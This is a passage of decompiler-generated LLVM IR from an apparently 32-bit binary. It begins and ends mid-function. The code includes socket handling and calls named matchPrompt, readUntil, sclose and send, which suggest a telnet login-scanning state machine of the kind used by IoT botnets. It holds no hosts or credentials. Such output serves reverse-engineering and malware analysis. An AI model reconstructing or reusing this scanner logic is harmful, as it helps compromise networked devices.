  %v3_804a463 = inttoptr i32 %v0_804a418 to i32*
  store i32 %v0_804a463, i32* %v3_804a463, align 4
  %v0_804a464 = load i32, i32* %stack_var_-188, align 4
  %v1_804a464 = load i32, i32* %stack_var_-184, align 4
  %v2_804a464 = load i32, i32* %stack_var_-180, align 4
  %v4_804a464 = load i32, i32* %stack_var_-172, align 4
  %v5_804a464 = call i32 @getsockopt(i32 %v0_804a464, i32 %v1_804a464, i32 %v2_804a464, i32 10000, i32 %v4_804a464)
  %v0_804a469 = load i32, i32* @esp, align 4
  %v3_804a46c = load i32, i32* %stack_var_-188, align 4
  %v1_804a472 = icmp eq i32 %v3_804a46c, 0
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a4d0 = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a4d0, i32* %eax.global-to-local, align 4
  br i1 %v1_804a472, label %dec_label_pc_804a4c1, label %dec_label_pc_804a476

dec_label_pc_804a476:                             ; preds = %dec_label_pc_804a428
  %v2_804a48b = add i32 %v0_804a469, 16
  %v3_804a48b = inttoptr i32 %v2_804a48b to i32*
  store i32 %v4_804a4d0, i32* %v3_804a48b, align 4
  %v0_804a48c = load i32, i32* %stack_var_-188, align 4
  %v1_804a48c = call i32 @sclose(i32 %v0_804a48c)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a4b7 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a4b7 = inttoptr i32 %v3_804a4b7 to i8*
  store i8 1, i8* %v4_804a4b7, align 1
  br label %dec_label_pc_804a5cd

dec_label_pc_804a4c1:                             ; preds = %dec_label_pc_804a428
  %v1_804a4d6 = add i32 %v0_804a469, 24
  %v2_804a4d6 = inttoptr i32 %v1_804a4d6 to i32*
  store i32 0, i32* %v2_804a4d6, align 4
  %v1_804a4d8 = add i32 %v0_804a469, 20
  %v2_804a4d8 = inttoptr i32 %v1_804a4d8 to i32*
  store i32 3, i32* %v2_804a4d8, align 4
  %v0_804a4da = load i32, i32* %eax.global-to-local, align 4
  %v2_804a4da = add i32 %v0_804a469, 16
  %v3_804a4da = inttoptr i32 %v2_804a4da to i32*
  store i32 %v0_804a4da, i32* %v3_804a4da, align 4
  %v0_804a4db = load i32, i32* %stack_var_-188, align 4
  %v1_804a4db = load i32, i32* %stack_var_-184, align 4
  %v2_804a4db = load i32, i32* %stack_var_-180, align 4
  %v3_804a4db = call i32 @__libc_fcntl(i32 %v0_804a4db, i32 %v1_804a4db, i32 %v2_804a4db)
  %v0_804a4e0 = load i32, i32* @esp, align 4
  %v13_804a4e5 = and i32 %v3_804a4db, -2049
  store i32 %v13_804a4e5, i32* @ebx, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a4f7 = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a4f7, i32* %eax.global-to-local, align 4
  %v2_804a4fd = add i32 %v0_804a4e0, 8
  %v3_804a4fd = inttoptr i32 %v2_804a4fd to i32*
  store i32 %v13_804a4e5, i32* %v3_804a4fd, align 4
  %v1_804a4fe = add i32 %v0_804a4e0, 4
  %v2_804a4fe = inttoptr i32 %v1_804a4fe to i32*
  store i32 4, i32* %v2_804a4fe, align 4
  %v0_804a500 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a500 = inttoptr i32 %v0_804a4e0 to i32*
  store i32 %v0_804a500, i32* %v3_804a500, align 4
  %v0_804a501 = load i32, i32* %stack_var_-188, align 4
  %v1_804a501 = load i32, i32* %stack_var_-184, align 4
  %v2_804a501 = load i32, i32* %stack_var_-180, align 4
  %v3_804a501 = call i32 @__libc_fcntl(i32 %v0_804a501, i32 %v1_804a501, i32 %v2_804a501)
  store i32 0, i32* %v1_804a35c, align 4
  %v1_804a534 = add i32 %v2_804a357, 16
  %v1_804a537 = inttoptr i32 %v1_804a534 to i16*
  store i16 0, i16* %v1_804a537, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804a54d = add i32 %v2_804a357, 20
  store i32 %v1_804a54d, i32* %eax.global-to-local, align 4
  %v1_804a550 = inttoptr i32 %v1_804a54d to i32*
  %v2_804a550 = load i32, i32* %v1_804a550, align 4
  store i32 %v2_804a550, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804a559 = load i32, i32* @esp, align 4
  %v2_804a55c = add i32 %v0_804a559, -8
  %v3_804a55c = inttoptr i32 %v2_804a55c to i32*
  store i32 1024, i32* %v3_804a55c, align 4
  %v1_804a55d = add i32 %v0_804a559, -12
  %v2_804a55d = inttoptr i32 %v1_804a55d to i32*
  store i32 0, i32* %v2_804a55d, align 4
  %v0_804a55f = load i32, i32* %edx.global-to-local, align 4
  %v2_804a55f = add i32 %v0_804a559, -16
  %v3_804a55f = inttoptr i32 %v2_804a55f to i32*
  store i32 %v0_804a55f, i32* %v3_804a55f, align 4
  %v0_804a560 = load i32, i32* %stack_var_-188, align 4
  %v1_804a560 = load i32, i32* %stack_var_-184, align 4
  %v2_804a560 = load i32, i32* %stack_var_-180, align 4
  %v3_804a560 = inttoptr i32 %v0_804a560 to i8*
  %v4_804a560 = call i32 @__GI_memset(i8* %v3_804a560, i32 %v1_804a560, i32 %v2_804a560)
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804a02e, align 8
  br label %dec_label_pc_804b3cf

dec_label_pc_804a581:                             ; preds = %dec_label_pc_804a387
  %v13_804a581 = icmp eq i32 %v5_804a413, -1
  %v1_804a585 = icmp eq i1 %v13_804a581, false
  br i1 %v1_804a585, label %dec_label_pc_804a5cd, label %dec_label_pc_804a587

dec_label_pc_804a587:                             ; preds = %dec_label_pc_804a581
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a596 = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a596, i32* %eax.global-to-local, align 4
  %v2_804a59c = add i32 %v0_804a418, 16
  %v3_804a59c = inttoptr i32 %v2_804a59c to i32*
  store i32 %v4_804a596, i32* %v3_804a59c, align 4
  %v1_804a59d = call i32 @sclose(i32 %v5_804a413)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a5c8 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a5c8 = inttoptr i32 %v3_804a5c8 to i8*
  store i8 1, i8* %v4_804a5c8, align 1
  br label %dec_label_pc_804a5cd

dec_label_pc_804a5cd:                             ; preds = %dec_label_pc_804a581, %dec_label_pc_804a476, %dec_label_pc_804a587
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804a359, i32* %eax.global-to-local, align 4
  %v2_804a5e1 = load i32, i32* %v1_804a35c, align 4
  store i32 %v2_804a5e1, i32* %eax.global-to-local, align 4
  %v1_804a5e3 = add i32 %v2_804a5e1, 10
  store i32 %v1_804a5e3, i32* @ebx, align 4
  %v0_804a5e6 = load i32, i32* @esp, align 4
  %v1_804a5e9 = add i32 %v0_804a5e6, -16
  %v2_804a5e9 = inttoptr i32 %v1_804a5e9 to i32*
  store i32 0, i32* %v2_804a5e9, align 4
  %v0_804a5eb = load i32, i32* %stack_var_-188, align 4
  %v1_804a5eb = inttoptr i32 %v0_804a5eb to i32*
  %v2_804a5eb = call i32 @__GI_time(i32* %v1_804a5eb)
  store i32 %v2_804a5eb, i32* %eax.global-to-local, align 4
  %v0_804a5f3 = load i32, i32* @ebx, align 4
  %v7_804a5f3 = icmp ult i32 %v0_804a5f3, %v2_804a5eb
  %v1_804a5f5 = icmp eq i1 %v7_804a5f3, false
  br i1 %v1_804a5f5, label %dec_label_pc_804b3cf, label %dec_label_pc_804a5fb

dec_label_pc_804a5fb:                             ; preds = %dec_label_pc_804a5cd
  %v0_804a5f0 = load i32, i32* @esp, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a60a = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a60a, i32* %eax.global-to-local, align 4
  %v3_804a610 = inttoptr i32 %v0_804a5f0 to i32*
  store i32 %v4_804a60a, i32* %v3_804a610, align 4
  %v0_804a611 = load i32, i32* %stack_var_-188, align 4
  %v1_804a611 = call i32 @sclose(i32 %v0_804a611)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a63c = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a63c = inttoptr i32 %v3_804a63c to i8*
  store i8 1, i8* %v4_804a63c, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a646:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v2_804a655 = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804a657 = add i32 %v2_804a655, 12
  store i32 %v1_804a657, i32* %eax.global-to-local, align 4
  %v1_804a65a = inttoptr i32 %v1_804a657 to i32*
  %v2_804a65a = load i32, i32* %v1_804a65a, align 4
  store i32 %v2_804a65a, i32* %eax.global-to-local, align 4
  %v1_804a65c = icmp eq i32 %v2_804a65a, 0
  %v1_804a65e = icmp eq i1 %v1_804a65c, false
  br i1 %v1_804a65e, label %dec_label_pc_804a685, label %dec_label_pc_804a660

dec_label_pc_804a660:                             ; preds = %dec_label_pc_804a646
  store i32 %v1_804a14566, i32* @ebx, align 4
  %v0_804a663 = load i32, i32* @esp, align 4
  %v1_804a666 = add i32 %v0_804a663, -16
  %v2_804a666 = inttoptr i32 %v1_804a666 to i32*
  store i32 0, i32* %v2_804a666, align 4
  %v1_804a668 = inttoptr i32 %v6_804a02e to i32*
  %v2_804a668 = call i32 @__GI_time(i32* %v1_804a668)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804a675 = load i32, i32* @ebx, align 4
  %v2_804a67b = mul i32 %v0_804a675, 24
  %v2_804a67e = add i32 %v2_804a67b, %v2_8049f6b
  %v1_804a680 = add i32 %v2_804a67e, 12
  store i32 %v1_804a680, i32* %eax.global-to-local, align 4
  %v2_804a683 = inttoptr i32 %v1_804a680 to i32*
  store i32 %v2_804a668, i32* %v2_804a683, align 4
  br label %dec_label_pc_804a685

dec_label_pc_804a685:                             ; preds = %dec_label_pc_804a646, %dec_label_pc_804a660
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804a696 = add i32 %v2_804a655, 20
  store i32 %v1_804a696, i32* %eax.global-to-local, align 4
  %v1_804a699 = inttoptr i32 %v1_804a696 to i32*
  %v2_804a699 = load i32, i32* %v1_804a699, align 4
  store i32 %v2_804a699, i32* %eax.global-to-local, align 4
  %v1_804a69b = load i32, i32* @esp, align 4
  %v2_804a69b = add i32 %v1_804a69b, -4
  %v3_804a69b = inttoptr i32 %v2_804a69b to i32*
  store i32 %v2_804a699, i32* %v3_804a69b, align 4
  %v0_804a69c = load i32, i32* %stack_var_-188, align 4
  %v1_804a69c = inttoptr i32 %v0_804a69c to i8*
  %v2_804a69c = call i32 @matchPrompt(i8* %v1_804a69c)
  store i32 %v2_804a69c, i32* %eax.global-to-local, align 4
  %v0_804a6a1 = load i32, i32* @esp, align 4
  %v1_804a6a1 = add i32 %v0_804a6a1, 4
  %v1_804a6a4 = icmp eq i32 %v2_804a69c, 0
  br i1 %v1_804a6a4, label %dec_label_pc_804a6bc, label %dec_label_pc_804a6a8

dec_label_pc_804a6a8:                             ; preds = %dec_label_pc_804a685
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 8, i8* %v4_804a02e, align 8
  %v1_804a702.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a6bc

dec_label_pc_804a6bc:                             ; preds = %dec_label_pc_804a685, %dec_label_pc_804a6a8
  %v1_804a702 = phi i32 [ %v1_804a6a1, %dec_label_pc_804a685 ], [ %v1_804a702.pre, %dec_label_pc_804a6a8 ]
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804a6cd = add i32 %v2_804a655, 16
  store i32 %v1_804a6cd, i32* %eax.global-to-local, align 4
  %v1_804a6d0 = inttoptr i32 %v1_804a6cd to i32*
  %v2_804a6d0 = load i32, i32* %v1_804a6d0, align 8
  %v1_804a6d4 = urem i32 %v2_804a6d0, 65536
  store i32 %v1_804a6d4, i32* @esi, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804a696, i32* %eax.global-to-local, align 4
  %v2_804a6ee = load i32, i32* %v1_804a699, align 4
  store i32 %v2_804a6ee, i32* @ebx, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a6ff = inttoptr i32 %v2_804a655 to i32*
  %v4_804a6ff = load i32, i32* %v3_804a6ff, align 8
  store i32 %v4_804a6ff, i32* %eax.global-to-local, align 4
  %v2_804a702 = add i32 %v1_804a702, -4
  %v3_804a702 = inttoptr i32 %v2_804a702 to i32*
  store i32 %v1_804a6d4, i32* %v3_804a702, align 4
  %v1_804a703 = add i32 %v1_804a702, -8
  %v2_804a703 = inttoptr i32 %v1_804a703 to i32*
  store i32 1024, i32* %v2_804a703, align 4
  %v0_804a708 = load i32, i32* @ebx, align 4
  %v2_804a708 = add i32 %v1_804a702, -12
  %v3_804a708 = inttoptr i32 %v2_804a708 to i32*
  store i32 %v0_804a708, i32* %v3_804a708, align 4
  %v1_804a709 = add i32 %v1_804a702, -16
  %v2_804a709 = inttoptr i32 %v1_804a709 to i32*
  store i32 10000, i32* %v2_804a709, align 4
  %v1_804a70e = add i32 %v1_804a702, -20
  %v2_804a70e = inttoptr i32 %v1_804a70e to i32*
  store i32 0, i32* %v2_804a70e, align 4
  %v1_804a710 = add i32 %v1_804a702, -24
  %v2_804a710 = inttoptr i32 %v1_804a710 to i32*
  store i32 0, i32* %v2_804a710, align 4
  %v1_804a712 = add i32 %v1_804a702, -28
  %v2_804a712 = inttoptr i32 %v1_804a712 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_805298f.34 to i32), i32* %v2_804a712, align 4
  %v0_804a717 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a717 = add i32 %v1_804a702, -32
  %v3_804a717 = inttoptr i32 %v2_804a717 to i32*
  store i32 %v0_804a717, i32* %v3_804a717, align 4
  %v0_804a718 = call i32 @readUntil()
  store i32 %v0_804a718, i32* %eax.global-to-local, align 4
  %v1_804a720 = icmp eq i32 %v0_804a718, 0
  br i1 %v1_804a720, label %dec_label_pc_804a79c, label %dec_label_pc_804a724

dec_label_pc_804a724:                             ; preds = %dec_label_pc_804a6bc
  store i32 0, i32* %v1_804a65a, align 4
  %v1_804a752 = inttoptr i32 %v1_804a6cd to i16*
  store i16 0, i16* %v1_804a752, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804a696, i32* %eax.global-to-local, align 4
  %v2_804a76b = load i32, i32* %v1_804a699, align 4
  store i32 %v2_804a76b, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804a774 = load i32, i32* @esp, align 4
  %v2_804a777 = add i32 %v0_804a774, -8
  %v3_804a777 = inttoptr i32 %v2_804a777 to i32*
  store i32 1024, i32* %v3_804a777, align 4
  %v1_804a778 = add i32 %v0_804a774, -12
  %v2_804a778 = inttoptr i32 %v1_804a778 to i32*
  store i32 0, i32* %v2_804a778, align 4
  %v0_804a77a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a77a = add i32 %v0_804a774, -16
  %v3_804a77a = inttoptr i32 %v2_804a77a to i32*
  store i32 %v0_804a77a, i32* %v3_804a77a, align 4
  %v0_804a77b = load i32, i32* %stack_var_-188, align 4
  %v1_804a77b = load i32, i32* %stack_var_-184, align 4
  %v2_804a77b = load i32, i32* %stack_var_-180, align 4
  %v3_804a77b = inttoptr i32 %v0_804a77b to i8*
  %v4_804a77b = call i32 @__GI_memset(i8* %v3_804a77b, i32 %v1_804a77b, i32 %v2_804a77b)
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 3, i8* %v4_804a02e, align 8
  br label %dec_label_pc_804b3cf

dec_label_pc_804a79c:                             ; preds = %dec_label_pc_804a6bc
  store i32 %v1_804a14566, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804a696, i32* %eax.global-to-local, align 4
  %v2_804a7b3 = load i32, i32* %v1_804a699, align 4
  %v1_804a7c0 = and i32 %v2_804a7b3, -256
  store i32 %v1_804a7c0, i32* %eax.global-to-local, align 4
  %v4_804a7c3 = inttoptr i32 %v2_804a7b3 to i8*
  store i32 %v2_804a7b3, i32* @edi, align 4
  %v3_804a7c9 = call i32 @_strlen(i8* %v4_804a7c3)
  %v0_804a7d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a7db = mul i32 %v0_804a7d5, 24
  %v1_804a7e0 = add i32 %v2_804a7de, %v2_804a7db
  %v1_804a7e3 = trunc i32 %v3_804a7c9 to i16
  %v3_804a7e3 = inttoptr i32 %v1_804a7e0 to i16*
  store i16 %v1_804a7e3, i16* %v3_804a7e3, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804a657, i32* %eax.global-to-local, align 4
  %v2_804a7fa = load i32, i32* %v1_804a65a, align 4
  store i32 %v2_804a7fa, i32* %eax.global-to-local, align 4
  %v1_804a7fc = add i32 %v2_804a7fa, 30
  store i32 %v1_804a7fc, i32* @ebx, align 4
  %v0_804a7ff = load i32, i32* @esp, align 4
  %v1_804a802 = add i32 %v0_804a7ff, -16
  %v2_804a802 = inttoptr i32 %v1_804a802 to i32*
  store i32 0, i32* %v2_804a802, align 4
  %v1_804a804 = inttoptr i32 %v2_804a7b3 to i32*
  %v2_804a804 = call i32 @__GI_time(i32* %v1_804a804)
  store i32 %v2_804a804, i32* %eax.global-to-local, align 4
  %v0_804a80c = load i32, i32* @ebx, align 4
  %v7_804a80c = icmp ult i32 %v0_804a80c, %v2_804a804
  %v1_804a80e = icmp eq i1 %v7_804a80c, false
  br i1 %v1_804a80e, label %dec_label_pc_804b3cf, label %dec_label_pc_804a814

dec_label_pc_804a814:                             ; preds = %dec_label_pc_804a79c
  %v0_804a809 = load i32, i32* @esp, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a823 = load i32, i32* %v3_804a6ff, align 8
  store i32 %v4_804a823, i32* %eax.global-to-local, align 4
  %v3_804a829 = inttoptr i32 %v0_804a809 to i32*
  store i32 %v4_804a823, i32* %v3_804a829, align 4
  %v1_804a82a = call i32 @sclose(i32 %v2_804a7b3)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a855 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a855 = inttoptr i32 %v3_804a855 to i8*
  store i8 1, i8* %v4_804a855, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a85f:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a86e = add i32 %.pre, %v2_804a02b
  %v4_804a86e = inttoptr i32 %v3_804a86e to i8*
  %v5_804a86e = load i8, i8* %v4_804a86e, align 2
  %v6_804a86e = zext i8 %v5_804a86e to i32
  store i32 %v6_804a86e, i32* %eax.global-to-local, align 4
  %v1_804a877 = mul nuw nsw i32 %v6_804a86e, 4
  %v2_804a877 = add nuw nsw i32 %v1_804a877, 134566216
  %v3_804a877 = inttoptr i32 %v2_804a877 to i32*
  %v4_804a877 = load i32, i32* %v3_804a877, align 4
  %v1_804a889 = and i32 %v4_804a877, -256
  store i32 %v1_804a889, i32* %eax.global-to-local, align 4
  %v4_804a88c = inttoptr i32 %v4_804a877 to i8*
  store i32 %v4_804a877, i32* @edi, align 4
  %v3_804a892 = call i32 @_strlen(i8* %v4_804a88c)
  store i32 %v3_804a892, i32* @esi, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v5_804a8aa = load i8, i8* %v4_804a86e, align 2
  %v6_804a8aa = zext i8 %v5_804a8aa to i32
  store i32 %v6_804a8aa, i32* %eax.global-to-local, align 4
  %v1_804a8b3 = mul nuw nsw i32 %v6_804a8aa, 4
  %v2_804a8b3 = add nuw nsw i32 %v1_804a8b3, 134566216
  %v3_804a8b3 = inttoptr i32 %v2_804a8b3 to i32*
  %v4_804a8b3 = load i32, i32* %v3_804a8b3, align 4
  store i32 %v4_804a8b3, i32* @ebx, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v2_804a8c9 = add i32 %v2_804a02b, %v2_8049f6b
  %v3_804a8c9 = inttoptr i32 %v2_804a8c9 to i32*
  %v4_804a8c9 = load i32, i32* %v3_804a8c9, align 8
  store i32 %v4_804a8c9, i32* %eax.global-to-local, align 4
  %v0_804a8cc = load i32, i32* @esp, align 4
  %v1_804a8cc = add i32 %v0_804a8cc, -4
  %v2_804a8cc = inttoptr i32 %v1_804a8cc to i32*
  store i32 16384, i32* %v2_804a8cc, align 4
  %v0_804a8d1 = load i32, i32* @esi, align 4
  %v2_804a8d1 = add i32 %v0_804a8cc, -8
  %v3_804a8d1 = inttoptr i32 %v2_804a8d1 to i32*
  store i32 %v0_804a8d1, i32* %v3_804a8d1, align 4
  %v0_804a8d2 = load i32, i32* @ebx, align 4
  %v2_804a8d2 = add i32 %v0_804a8cc, -12
  %v3_804a8d2 = inttoptr i32 %v2_804a8d2 to i32*
  store i32 %v0_804a8d2, i32* %v3_804a8d2, align 4
  %v0_804a8d3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a8d3 = add i32 %v0_804a8cc, -16
  %v3_804a8d3 = inttoptr i32 %v2_804a8d3 to i32*
  store i32 %v0_804a8d3, i32* %v3_804a8d3, align 4
  %v4_804a8d4 = call i32 @__libc_send(i32 %v4_804a877, i32 %stack_var_-224.264, i32 %.v2_8049ee0, i32 %v2_8049f6b)
  %v0_804a8d9 = load i32, i32* @esp, align 4
  %v2_804a8dc = icmp slt i32 %v4_804a8d4, 0
  %v1_804a8de = icmp eq i1 %v2_804a8dc, false
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a93a = load i32, i32* %v3_804a8c9, align 8
  store i32 %v4_804a93a, i32* %eax.global-to-local, align 4
  br i1 %v1_804a8de, label %dec_label_pc_804a92b, label %dec_label_pc_804a8e0

dec_label_pc_804a8e0:                             ; preds = %dec_label_pc_804a85f
  %v3_804a8f5 = inttoptr i32 %v0_804a8d9 to i32*
  store i32 %v4_804a93a, i32* %v3_804a8f5, align 4
  %v1_804a8f6 = call i32 @sclose(i32 %v4_804a877)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a921 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a921 = inttoptr i32 %v3_804a921 to i8*
  store i8 1, i8* %v4_804a921, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a92b:                             ; preds = %dec_label_pc_804a85f
  %v1_804a93d = add i32 %v0_804a8d9, 12
  %v2_804a93d = inttoptr i32 %v1_804a93d to i32*
  store i32 16384, i32* %v2_804a93d, align 4
  %v1_804a942 = add i32 %v0_804a8d9, 8
  %v2_804a942 = inttoptr i32 %v1_804a942 to i32*
  store i32 2, i32* %v2_804a942, align 4
  %v1_804a944 = add i32 %v0_804a8d9, 4
  %v2_804a944 = inttoptr i32 %v1_804a944 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052995.35 to i32), i32* %v2_804a944, align 4
  %v0_804a949 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a949 = inttoptr i32 %v0_804a8d9 to i32*
  store i32 %v0_804a949, i32* %v3_804a949, align 4
  %v4_804a94a = call i32 @__libc_send(i32 %v4_804a877, i32 %stack_var_-224.264, i32 %.v2_8049ee0, i32 %v2_8049f6b)
  %v0_804a94f = load i32, i32* @esp, align 4
  %v2_804a952 = icmp slt i32 %v4_804a94a, 0
  %v1_804a954 = icmp eq i1 %v2_804a952, false
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v1_804a954, label %dec_label_pc_804a9a1, label %dec_label_pc_804a956

dec_label_pc_804a956:                             ; preds = %dec_label_pc_804a92b
  %v4_804a965 = load i32, i32* %v3_804a8c9, align 8
  store i32 %v4_804a965, i32* %eax.global-to-local, align 4
  %v3_804a96b = inttoptr i32 %v0_804a94f to i32*
  store i32 %v4_804a965, i32* %v3_804a96b, align 4
  %v1_804a96c = call i32 @sclose(i32 %v4_804a877)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a997 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a997 = inttoptr i32 %v3_804a997 to i8*
  store i8 1, i8* %v4_804a997, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a9a1:                             ; preds = %dec_label_pc_804a92b
  store i8 4, i8* %v4_804a02e, align 8
  br label %dec_label_pc_804b3cf

dec_label_pc_804a9ba:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v2_804a9c9 = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804a9cb = add i32 %v2_804a9c9, 12
  store i32 %v1_804a9cb, i32* %eax.global-to-local, align 4
  %v1_804a9ce = inttoptr i32 %v1_804a9cb to i32*
  %v2_804a9ce = load i32, i32* %v1_804a9ce, align 4
  store i32 %v2_804a9ce, i32* %eax.global-to-local, align 4
  %v1_804a9d0 = icmp eq i32 %v2_804a9ce, 0
  %v1_804a9d2 = icmp eq i1 %v1_804a9d0, false
  br i1 %v1_804a9d2, label %dec_label_pc_804a9f9, label %dec_label_pc_804a9d4

dec_label_pc_804a9d4:                             ; preds = %dec_label_pc_804a9ba
  store i32 %v1_804a14566, i32* @ebx, align 4
  %v0_804a9d7 = load i32, i32* @esp, align 4
  %v1_804a9da = add i32 %v0_804a9d7, -16
  %v2_804a9da = inttoptr i32 %v1_804a9da to i32*
  store i32 0, i32* %v2_804a9da, align 4
  %v1_804a9dc = inttoptr i32 %v6_804a02e to i32*
  %v2_804a9dc = call i32 @__GI_time(i32* %v1_804a9dc)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804a9e9 = load i32, i32* @ebx, align 4
  %v2_804a9ef = mul i32 %v0_804a9e9, 24
  %v2_804a9f2 = add i32 %v2_804a9ef, %v2_8049f6b
  %v1_804a9f4 = add i32 %v2_804a9f2, 12
  store i32 %v1_804a9f4, i32* %eax.global-to-local, align 4
  %v2_804a9f7 = inttoptr i32 %v1_804a9f4 to i32*
  store i32 %v2_804a9dc, i32* %v2_804a9f7, align 4
  br label %dec_label_pc_804a9f9

dec_label_pc_804a9f9:                             ; preds = %dec_label_pc_804a9ba, %dec_label_pc_804a9d4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804aa0a = add i32 %v2_804a9c9, 16
  store i32 %v1_804aa0a, i32* %eax.global-to-local, align 4
  %v1_804aa0d = inttoptr i32 %v1_804aa0a to i32*
  %v2_804aa0d = load i32, i32* %v1_804aa0d, align 8
  %v1_804aa11 = urem i32 %v2_804aa0d, 65536
  store i32 %v1_804aa11, i32* @esi, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804aa28 = add i32 %v2_804a9c9, 20
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v1_804aa2b = inttoptr i32 %v1_804aa28 to i32*
  %v2_804aa2b = load i32, i32* %v1_804aa2b, align 4
  store i32 %v2_804aa2b, i32* @ebx, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804aa3c = inttoptr i32 %v2_804a9c9 to i32*
  %v4_804aa3c = load i32, i32* %v3_804aa3c, align 8
  store i32 %v4_804aa3c, i32* %eax.global-to-local, align 4
  %v1_804aa3f = load i32, i32* @esp, align 4
  %v2_804aa3f = add i32 %v1_804aa3f, -4
  %v3_804aa3f = inttoptr i32 %v2_804aa3f to i32*
  store i32 %v1_804aa11, i32* %v3_804aa3f, align 4
  %v1_804aa40 = add i32 %v1_804aa3f, -8
  %v2_804aa40 = inttoptr i32 %v1_804aa40 to i32*
  store i32 1024, i32* %v2_804aa40, align 4
  %v0_804aa45 = load i32, i32* @ebx, align 4
